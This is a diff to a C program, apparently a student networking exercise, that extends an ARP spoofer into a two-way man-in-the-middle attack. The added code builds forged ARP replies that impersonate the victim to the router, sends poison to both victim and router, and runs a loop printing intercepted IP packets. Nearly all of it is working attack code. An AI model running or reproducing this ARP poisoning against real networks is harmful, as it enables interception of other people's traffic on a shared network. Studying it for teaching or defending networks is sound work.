@@ -9,8 +9,10 @@
 #include <stdio.h>
 #include <arpa/inet.h>
 #include <string.h>
+#include <netinet/ip.h>
 
 static int g_sock_raw = -1;
+static uint8_t g_router_mac[6];
 
 void sigint_handler(int signum)
 {
@@ -125,7 +127,7 @@ t_ethernet_frame build_eth_frame(const t_arp_packet *arp_reply)
 }
 
 
-t_arp_packet build_arp_reply(const t_arp_packet *arp_request, 
+t_arp_packet build_arp_reply(const t_arp_packet *arp_request,
     const t_arp_packet *user_input)
 {
     t_arp_packet reply;
@@ -145,6 +147,48 @@ t_arp_packet build_arp_reply(const t_arp_packet *arp_request,
     return reply;
 }
 
+t_arp_packet build_arp_reply_router(const t_arp_packet *user_input)
+{
+    t_arp_packet reply;
+
+    reply.htype  = htons(1);
+    reply.ptype  = htons(0x0800);
+    reply.hlen   = 6;
+    reply.plen   = 4;
+    reply.opcode = htons(ARPOP_REPLY);
+
+    /* On se fait passer pour la victime */
+    ft_memcpy(reply.sender_ip,  user_input->target_ip,  4);
+    ft_memcpy(reply.sender_mac, user_input->sender_mac, 6);
+    ft_memcpy(reply.target_ip,  user_input->sender_ip,  4);
+    ft_memcpy(reply.target_mac, g_router_mac, 6);
+    return reply;
+}
+
+void sniff_packets(int sock_raw)
+{
+    char buffer[1600];
+    struct ethhdr *eth;
+    struct iphdr  *ip;
+
+    printf("[INFO] Listening for intercepted IP packets (Ctrl+C to stop)...\n");
+    for (int i = 0; i < 5; i++)
+    {
+        ssize_t len = recvfrom(sock_raw, buffer, sizeof(buffer), 0, NULL, NULL);
+        if (len <= 0)
+            continue;
+        eth = (struct ethhdr *)buffer;
+        if (ntohs(eth->h_proto) != ETH_P_IP)
+            continue;
+        ip = (struct iphdr *)(buffer + sizeof(struct ethhdr));
+        struct in_addr s, d;
+        s.s_addr = ip->saddr;
+        d.s_addr = ip->daddr;
+        printf("Packet %d: %s -> %s | size %zd bytes\n", i + 1,
+               inet_ntoa(s), inet_ntoa(d), len);
+    }
+}
+
 
 
 int main(int argc, char *argv[])
@@ -156,7 +200,7 @@ int main(int argc, char *argv[])
     t_arp_packet    *arp_pkt;
 
     signal(SIGINT, sigint_handler);
-    if (!parsing_arg(argc, argv, &reponse))
+    if (!parsing_arg(argc, argv, &reponse, g_router_mac))
         return EXIT_FAILURE;
     int sock_raw = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
     if (sock_raw < 0) {
@@ -182,10 +226,15 @@ int main(int argc, char *argv[])
             t_arp_packet arp_reply = build_arp_reply(arp_pkt, &reponse);
             t_ethernet_frame frame  = build_eth_frame(&arp_reply);
             print_ethernet_frame(&frame);
-                ssize_t sent = send_arp_frame(sock_raw, &frame, iface);
+            ssize_t sent = send_arp_frame(sock_raw, &frame, iface);
             if (sent > 0)
             {
                 printf("[INFO] ARP Reply envoyé à la victime !\n");
+                t_arp_packet router_reply = build_arp_reply_router(&reponse);
+                t_ethernet_frame frame_r = build_eth_frame(&router_reply);
+                send_arp_frame(sock_raw, &frame_r, iface);
+                printf("[INFO] ARP Reply envoyé au routeur !\n");
+                sniff_packets(sock_raw);
                 break ;
             }
         }
